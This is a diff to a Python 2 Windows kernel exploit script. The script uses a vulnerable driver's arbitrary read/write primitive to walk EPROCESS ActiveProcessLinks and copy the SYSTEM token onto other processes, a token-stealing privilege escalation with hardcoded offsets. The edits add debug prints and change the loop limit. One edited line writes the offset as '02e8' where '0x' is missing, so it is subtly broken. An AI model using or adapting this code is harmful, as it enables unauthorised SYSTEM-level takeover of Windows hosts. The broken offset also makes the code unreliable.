@@ -293,8 +293,8 @@ def executeOverwrite():
         system_EPROCESS_struct_ptr = get_PsISP_kernel_address(driver, kernel_base, img_name)
 
         # Define our expected offsets for this version of Windows.
-        ACTIVE_PROC_LINK_OFFSET = int(0x2e8)
-        TOKEN_OFFSET = int(0x358)
+        ACTIVE_PROC_LINK_OFFSET = 0x2e8
+        TOKEN_OFFSET = 0x358
 
         # Calculate SYSTEM token
         location_of_system_token = system_EPROCESS_struct_ptr + TOKEN_OFFSET 
@@ -310,7 +310,8 @@ def executeOverwrite():
         ptr_firstEPROCESS = readValueatAddress(driver, system_EPROCESS_struct_ptr+0x2e8, USER_ADDR_OFFSET)
         deref_ptr_firstEPROCESS = readValueatAddress(driver, ptr_firstEPROCESS, USER_ADDR_OFFSET)
         backEPROCESS = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
-        
+        print "Very first backEPROCESS is: " + hex(backEPROCESS)
+
 
 
         while True:
@@ -318,18 +319,19 @@ def executeOverwrite():
             print "Finding next link from that offset..."
 
             ptr_forwardEPROCESS = readValueatAddress(driver, backEPROCESS, USER_ADDR_OFFSET)
-            deref_ptr_forwardEPROCESS = readValueatAddress(driver, ptr_forwardEPROCESS, USER_ADDR_OFFSET)
+            deref_ptr_forwardEPROCESS = readValueatAddress(driver, ptr_forwardEPROCESS+02e8, USER_ADDR_OFFSET)
             forwardEPROCESS = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
 
-            print hex(forwardEPROCESS)
+            print "Forward link is: " + hex(forwardEPROCESS)
 
-
-            backEPROCESS = forwardEPROCESS
-            where=backEPROCESS+0x358
+            where=forwardEPROCESS+0x358
             writeWhatWhere(driver, system_token_value, where)
             total_writes = total_writes + 1
 
-            if total_writes > 50:
+            backEPROCESS = forwardEPROCESS
+            
+
+            if total_writes > 5:
                 break
             
 
